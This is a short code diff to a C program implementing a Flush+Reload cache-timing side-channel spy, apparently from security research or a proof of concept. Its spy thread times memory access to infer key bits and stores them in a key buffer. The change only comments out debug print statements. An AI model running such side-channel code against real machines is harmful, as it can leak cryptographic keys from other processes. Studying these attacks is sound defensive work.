@@ -64,7 +64,7 @@ bool __attribute((always_inline)) flush_reload(void* addr)
 	end = rdtsc();
 	asm volatile("mfence");
     flush(addr);
-        printf("%llu\n",end-start);
+        //printf("%llu\n",end-start);
     if((end-start)<flush_reload_threshold)
     {
         return 1;
@@ -86,21 +86,21 @@ void* spyth(void* arg)
 			}
 			if(flush_reload(addr))
 			{
-				printf("1 ");
+				//printf("1 ");
 				key[i]='1';
 			}
 			else
 			{
-				printf("0 ");
+				//printf("0 ");
 				key[i]='0';
 			}
 			i++;
 			flush(addr);
 			if(i>500){break;}
 			alternate =1;
+			//printf("spyth %d\n  ",i);
 			pthread_mutex_unlock(&mutex);
 			pthread_cond_signal(&cond);
-			printf("spyth %d\n ",i);
 		}
 		
 		key[i]=0;
